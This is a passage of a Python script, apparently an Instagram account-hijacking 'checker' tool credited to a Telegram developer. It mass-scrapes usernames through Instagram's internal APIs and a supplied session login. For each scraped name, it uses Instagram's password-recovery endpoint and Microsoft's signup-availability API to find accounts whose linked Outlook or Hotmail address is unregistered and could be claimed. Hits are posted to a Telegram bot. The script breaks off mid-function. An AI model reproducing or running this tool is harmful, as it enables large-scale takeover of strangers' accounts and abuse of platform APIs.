
import random
import os
from rich.console import Console
from rich.live import Live
import requests
from user_agent import generate_user_agent
import sys
import webbrowser
import sys as n
from datetime import datetime
from colorama import Fore, Back
import time
import secrets
from time import time
from secrets import token_hex
from random import randrange,choice
from time import sleep
from uuid import uuid4
import string
import json
from threading import Thread
import uuid
from requests import get
from concurrent.futures import ThreadPoolExecutor
from hashlib import md5
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
#----------

# Define color codes
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
F = '\033[1;32m' 
n = "\033[97m"
C = "\033[1;97m"
X = '\033[1;33m' 
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
N = "\033[1;37m"  # White
S = '\033[1;33m'
F = '\033[1;33m' #اصفر
A  = '\033[2;34m'#ازرق
Z = '\033[1;31m' #احمر
H="\x1b[38;5;208m"
MAGENTA = '\033[95m'
reset = "\033[0m"
r = "\033[0m"
bbo = "\033[1m"
bo = "\033[1m"
normal = "\033[0m"

Ex = 0
hits = 0
bads_instgram = 0
bads_email = 0
gmmail = 0
aca = 0
gg = 0
#uui = requests.get('https://pastebin.com/raw/uh7YtXjq').text
#if uui == 'ON':
#    pass
#else:
#    print(f'{r}{C}[{N}+{C}]{N} TOOLS STOPPED FOR PREMIUM VERSION DM @')
#    exit()
WDEH = render('instagram', colors=['white', 'cyan'], align='center')
print(WDEH)
print('')

ID = input(f"Id: {r}")
print('')

token = input(f"Token: {r}")
def Users():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        UseriD = str(random.randrange(10000, 17699999))
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        username = response.json()['data']['user']['username']
        with open("username.txt", "a") as file:
            file.write(username + "\n")
        Ex+=1
        sys.stdout.write(f"\r[{N}{Ex}{C}]{r}-> USERNAME : {username}{reset}\r")
        return username
    except Exception as e:
        return None
def ExUsers():
    for _ in range(2500):
        Users()
def tnach():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        UseriD = str(random.randrange(10000, 263014407))
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        username = response.json()['data']['user']['username']
        with open("username.txt", "a") as file:
            file.write(username + "\n")
        Ex+=1
        sys.stdout.write(f"\r[{N}{Ex}{C}]{r}-> USERNAME : {username}{reset}\r")
        return username
    except Exception as e:
        return None
def u():
    for _ in range(2500):
        tnach()
def tlt():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        UseriD = str(random.randrange(10000, 361365133))
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        username = response.json()['data']['user']['username']
        with open("username.txt", "a") as file:
            file.write(username + "\n")
        Ex+=1
        sys.stdout.write(f"\r[{N}{Ex}{C}]{r}-> USERNAME : {username}{reset}\r")
        return username
    except Exception as e:
        return None
def qh():
    for _ in range(2500):
        tlt()
def rba():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        UseriD = str(random.randrange(10000, 61331927186))
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        username = response.json()['data']['user']['username']
        with open("username.txt", "a") as file:
            file.write(username + "\n")
        Ex+=1
        sys.stdout.write(f"\r[{N}{Ex}{C}]{r}-> USERNAME : {username}{reset}\r")
        return username
    except Exception as e:
        return None
def bh():
    for _ in range(2500):
        rba()
def fs(id):
    global gg
    url = f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&search_surface=follow_list_pag'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    for i in r.json()['users']:
        gg+=1
        userL = i['username']
        print(f"\r[{N}{gg}{C}]-> USERNAME : {userL}{reset}\r")
        open("username.txt", "a").write(f'{userL}\n')
    if 'HI' in listoo:
        m_id=r.json()['next_max_id']
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&max_id='+m_id+'&search_surface=follow_list_page',headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            print()
            try:
                for i in r.json()['users']:
                    gg+=1
                    userL = i["username"]
                    print(f"\r[{N}{gg}{C}]-> USERNAME : {userL}{reset}\r")
                    open("username.txt", "a").write(f'{userL}\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()
def fg(id):
    global gg
    url = f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    print()
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    for i in r.json()['users']:
        gg+=1
        userL = i['username']
        print(f"\r[{N}{gg}{C}]-> USERNAME : {userL}{reset}\r")
        open("username.txt", "a").write(f'{userL}\n')
    if 'HI' in listoo:
        try:
            m_id=r.json()['next_max_id']
        except KeyError:
            exit()
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200&max_id='+m_id,headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            try:
                for i in r.json()['users']:
                    gg+=1
                    userL = i["username"]
                    print(f"\r[{N}{gg}{C}]-> USERNAME : {userL}{reset}\r")
                    open("username.txt", "a").write(f'{userL}\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()	
print(f"""I\n
{r}1{C}{r}{bbo} ->   {C}Check instagram{N} {r}

{N}2{C}{r}{bbo} -> {C}  Make List  {r}

{N}3{C}{r}{bbo} ->   {C}Delete List {N}{r}

{N}4{C}{r}{bbo} ->   {C}Develloper {r}
""")
try:
 
 egi = int(input(f"{C}[{N}→{C}] {N}Enter your choice: {r}"))
except:print('');exit(print(f'{C}[{N}+{C}] {N}Enter Correct Number'))
if egi == 1:
    try:requests.get(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&video=https://t.me/MR_WEBV12/6&caption=\n\n")
    except:pass
    pass
elif egi == 2:
    
    print(f"""
    {r}[{N}1{C}] -> {C}  Make List {N}2011
    [{N}2{C}] -> {C}  Make List {N}2012
    [{N}3{C}] -> {C}  Make List {N}2013
    [{N}4{C}] -> {C}  Make List {N}15-25
    [{N}5{C}] -> {C}  Make List {N}MY USER
    """)
    
    hh = int(input(f"{C}[{N}→{C}] {N}choice: {r}"))
    if hh ==1:
      threads = []
      for _ in range(100):
        thread = Thread(target=ExUsers)
        thread.start()
        threads.append(thread)
      for thread in threads:
        thread.join()
    elif hh ==2:
      threads = []
      for _ in range(100):
        thread = Thread(target=u)
        thread.start()
        threads.append(thread)
      for thread in threads:
        thread.join()
    elif hh ==3:
      threads = []
      for _ in range(100):
        thread = Thread(target=qh)
        thread.start()
        threads.append(thread)
      for thread in threads:
        thread.join()
    elif hh ==4:
      threads = []
      for _ in range(100):
        thread = Thread(target=bh)
        thread.start()
        threads.append(thread)
      for thread in threads:
        thread.join()
    elif hh == 5:
       gg = 0
       listoo = ['HI']    
       linux = 'clear'
       windows = 'cls'
       print('') 
       username = str(input(f"{r}[{N}+{C}] -> {C}  𝗨𝗿 𝗔𝗰𝗰 𝘂𝘀𝗲𝗿 : "))
       print('')
       password = str(input(f"{r}[{N}+{C}] -> {C}  𝗨𝗿 𝗔𝗰𝗰 𝗽𝗮𝘀𝘀 : "))
       print('')
       [linux, windows][os.name == 'nt']
       url = 'https://www.instagram.com/accounts/login/ajax/'
       data = {'username': f'{username}',
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                   'queryParams': '{}',
               'optIntoOneTap': 'false'}            
       headers = {'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '275',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
            'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': 'bc3d5af829ea',
            'x-requested-with': 'XMLHttpRequest'}		
       k = requests.post(url,headers=headers,data=data)
       if 'authenticated":true' in k.text or 'userId' in k.text:
           print(f"{r}[{N}+{C}] -> {N}  Good Login ✅")
           print('')
           ([linux, windows][os.name == 'nt'])
           sessionid = k.cookies['sessionid']
       else:
           print(f"{r}[{N}+{C}]{N}  False Account ")
           exit()
       user = str(input(f"{r}[{N}+{C}] -> {N}  User To Get List : "))
       listoo = ['HI']
       rs_id = requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={
		 'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
    'X-Requested-With': 'XMLHttpRequest',
        });jsn3=rs_id.json()['data']['user']
       id_tr = jsn3['id']
       print('')
       print(f"{r}[{N}1{C}] -> {N}  From Following  ")
       print('')
       print(f"{r}[{N}2{C}] -> {N}  From Followers  ")
       print('')
       o = str(input(f"{C}[{N}→{C}] {N}Enter your choice: {r}"))
       if o == '1':
         fg(id_tr)
       elif o == '2':
          fs(id_tr)
       else:
           print(f"{r}[{N}+{C}]{N}  No Number ")
           exit()
elif egi == 3:
    def fff():
        txt= 'username.txt'
        os.system(f'rm -rf {txt}')
        print('')
        print(f'{r}{C}[{N}+{C}]{N} List has been deleted')
        exit()
    fff()
elif egi == 4:
    print(f"""
    {r}[{N}1{C}] {r}-> {N}  F1 Channel
    [{N}2{C}]{r} -> {N}  F1 Telegram
    """)
    f1 = int(input(f"{C}[{N}→{C}] {N}Enter your choice: {r}"))
    if f1 == 1:
        webbrowser.open('https://t.me/p_y_hy')
        exit()
    elif f1 == 2:
      webbrowser.open('https://t.me/AHMED_KHANA')
      exit()
else:print('');exit(print(f'{C}[{N}+{C}] {N}Enter Correct Number'))
namefile1 = str(input(f'{r}{C}[{N}→{C}]{N} Enter Name File : '))
if not namefile1.endswith('.txt'):
        namefile1 += '.txt'
def namefile():
  while True:
    try:
      ooo = open(namefile1, "r").read().splitlines()
      return ooo
    except FileNotFoundError:
      print(f"{R}{bbo}No file found{r}")
      continue
list99 = namefile()
#-----file-----
#------canary-----
req=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
cok = token_hex(8) * 2
amsc=req.cookies.get_dict()['amsc']
canary=str.encode(req.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
#------canary-----
#-----rest-----
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST !'
  return r
#-----rest-----
#-----info------
def info(username,jj):
  global hits,aca
  hits+=1
  try:
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://storiesig.info',
    'priority': 'u=1, i',
    'referer': 'https://storiesig.info/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
    rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
    Id = rrr['result']['user']['pk']
    fows = rrr['result']['user']['follower_count']
    fowg = rrr['result']['user']['following_count']
    pp = rrr['result']['user']['media_count']
    try:
      api = 'https://alany.pythonanywhere.com/'
      params = {'id':Id}
      response = requests.get(api,params=params).json()
      date=response['date']
      #---- by Aegos
    except:
      date='none'
    aca+=1
    tlg = f'''
⋘─────━احمد━─────⋙ 
Hits : {aca}
Followers : {fows}
Following : {fowg}
Post : {pp}
USERNAME : {username}
DATA : {date}
EMAIL : {username}@{jj}
Rest : {rest(username)}
 ⋘─────━خان━───── 
 Dev:@AHMED_KHANA
'''
    print(tlg)
    with open('ahmed.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    aca+=1
    tlg = f'''
⋘─────━احمد━─────⋙     
Hits  :  {aca}
USERNAME : {username}
EMAIL : {username}@{jj}
REST : {rest(username)}
Link : https://www.instagram.com/{username}
⋘─────━خان━─────⋙ 
Dev:@AHMED_KHANA
'''
    print(tlg)
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('ahmed.txt','a') as ff:
      ff.write(f'{tlg}\n')

#-----check-----
print(f"""
    {r}1{C} -> {C}  𝗢𝘂𝘁𝗹𝗼𝗼𝗸
    2{C} -> {C}  𝗛𝗼𝘁𝗺𝗮𝗶𝗹
    3{C} -> {C}  𝗚𝗺𝗮𝗶𝗹
    """)
ik = int(input(f"{C}[{N}→{C}] {N} choice: {r}"))
if ik == 1:
 def hot(email):
            global bads_email
            cookies = {
                            'mkt': 'ar-YE',
                            f'MicrosoftApplicationsTelemetryDeviceId': '{Lol}',
                            'MUID': f'{cok}',
                            'mkt1': 'ar-AR',
                            'ai_session': 'CyuLoU6vSi7HJzZeYNyVoH|1709731817506|1709731817506',
                            'amsc': f'{amsc}',
                            'clrc': '{%2219789%22%3a[%22+VC+x0R6%22%2c%22FutSZdvn%22%2c%22d7PFy/1V%22]}',
                        }								
            headers = {
                            'authority': 'signup.live.com',
                            'accept': 'application/json',
                            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                            'canary': f'{canary}',
                            'content-type': 'application/json',
                            'hpgid': '200639',
                            'origin': 'https://signup.live.com',
                            'referer': 'https://signup.live.com/signup?mkt=AR-AR&lic=1&uaid=ad311362ab454b14bb81937965f86b8d',
                            'scid': '100118',
                            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                            'sec-ch-ua-mobile': '?1',
                            'sec-ch-ua-platform': '"Android"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'tcxt': 'VWlP20OW8k/xH6tFupQw1HwrEFETf+tDxcIS0OeqhsBSbBIMy4srnqBeqY1i2lMA5VbPfXSuTUEhdSw9AWoPPSNJeuzfyYceefIZ/1EGoBqppRyXgczQuaM5teemKuAKiUXDaBYMj8Ng8fhejlVVuQmHCBl+PgEGlG7A/8uqXNwqIlrg9tbOqIzHkn5X1jUytMlmFxmEjdLCQnainFfCoxqgPZjkQwcE6hQFElIuxniqWRWk6lmEleIPwhGFID2kbSE5kxjiT5eoUt/S5zxP2a1Yp+shu8ITJrys5pkwMbsWO+L18h8bH4+BG3LFLJk00zd28yeJz7uTq3NRNR1uK+OiCVwGdB5JhxmvsItOIwHc83/xeN0XuTlXGgueChmPKulABKjR4v0VDkutbyPQwRVqRPRALfutQaEjOXdx9FXOCUTySJLtPpeMPIj172+PUSlBhgueKn3Iiz2mzKbR8Kv4JgBlQF5m3dVYyNpSN998fVQE3x94ruAsioYwEOBdfEViB34QpbzAuNfoNmNisCvzI9PKzc+cDKeWkcVd7OtYQSR0AR2Ibr6LE0iulNI5/zqg/BYp3Vf2zaExAmpf8Q==:2:3',
                            'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                            'uiflvr': '1001',
                            'user-agent': generate_user_agent(),
                            'x-ms-apitransport': 'xhr',
                            'x-ms-apiversion': '2',
                        }
            params = {
                            'mkt': 'AR-AR',
                            'lic': '1',
                            'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                        }
            data = {
                                'signInName': f'{email}',
                                'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                                'includeSuggestions': True,
                                'uiflvr': 1001,
                                'scid': 100118,
                                'hpgid': 200639,
                            }
            res = requests.post('https://signup.live.com/API/CheckAvailableSigninNames',params=params,cookies=cookies,headers=headers,json=data,).text
            if 'isAvailable":true' in res:
               username,jj=email.split('@')
               info(username,jj)
            else:bads_email+=1
 def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'
    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }
        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
        if '"status":"ok"' in respon:hot(email)
        else:bads_instgram+=1
  except:''
  bi = random.randint(5,208)
  bos = f'\x1b[38;5;{bi}m'
  sys.stdout.write(f'''\r{bos}[{r}{bbo}{n} 𝐅𝟏 {bos}{r} {bbo}{n}Hits:{r} {bbo}{G}{hits} {n}Bad IG:{r}{bbo} {R}{bads_instgram} {r}{bbo}{n}Bad Email: {r}{bbo}{X}{bads_email}{r}{bbo}{r}{bos} ]  \r''')
 executor = ThreadPoolExecutor(max_workers=30)
 for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@outlook.com'
      executor.submit(check, email)
    except:''
if ik == 2:
 def hott(email):
            global bads_email
            cookies = {
                            'mkt': 'ar-YE',
                            f'MicrosoftApplicationsTelemetryDeviceId': '{Lol}',
                            'MUID': f'{cok}',
                            'mkt1': 'ar-AR',
                            'ai_session': 'CyuLoU6vSi7HJzZeYNyVoH|1709731817506|1709731817506',
                            'amsc': f'{amsc}',
                            'clrc': '{%2219789%22%3a[%22+VC+x0R6%22%2c%22FutSZdvn%22%2c%22d7PFy/1V%22]}',
                        }								
            headers = {
                            'authority': 'signup.live.com',
                            'accept': 'application/json',
                            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                            'canary': f'{canary}',
                            'content-type': 'application/json',
                            'hpgid': '200639',
                            'origin': 'https://signup.live.com',
                            'referer': 'https://signup.live.com/signup?mkt=AR-AR&lic=1&uaid=ad311362ab454b14bb81937965f86b8d',
                            'scid': '100118',
                            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                            'sec-ch-ua-mobile': '?1',
                            'sec-ch-ua-platform': '"Android"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'tcxt': 'VWlP20OW8k/xH6tFupQw1HwrEFETf+tDxcIS0OeqhsBSbBIMy4srnqBeqY1i2lMA5VbPfXSuTUEhdSw9AWoPPSNJeuzfyYceefIZ/1EGoBqppRyXgczQuaM5teemKuAKiUXDaBYMj8Ng8fhejlVVuQmHCBl+PgEGlG7A/8uqXNwqIlrg9tbOqIzHkn5X1jUytMlmFxmEjdLCQnainFfCoxqgPZjkQwcE6hQFElIuxniqWRWk6lmEleIPwhGFID2kbSE5kxjiT5eoUt/S5zxP2a1Yp+shu8ITJrys5pkwMbsWO+L18h8bH4+BG3LFLJk00zd28yeJz7uTq3NRNR1uK+OiCVwGdB5JhxmvsItOIwHc83/xeN0XuTlXGgueChmPKulABKjR4v0VDkutbyPQwRVqRPRALfutQaEjOXdx9FXOCUTySJLtPpeMPIj172+PUSlBhgueKn3Iiz2mzKbR8Kv4JgBlQF5m3dVYyNpSN998fVQE3x94ruAsioYwEOBdfEViB34QpbzAuNfoNmNisCvzI9PKzc+cDKeWkcVd7OtYQSR0AR2Ibr6LE0iulNI5/zqg/BYp3Vf2zaExAmpf8Q==:2:3',
                            'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                            'uiflvr': '1001',
                            'user-agent': generate_user_agent(),
                            'x-ms-apitransport': 'xhr',
                            'x-ms-apiversion': '2',
                        }
            params = {
                            'mkt': 'AR-AR',
                            'lic': '1',
                            'uaid': f'936f243a-6a6d-49c2-8f6f-5a6a5a5a5a5a',
                        }
            data = {
                                'signInName': f'{email}',
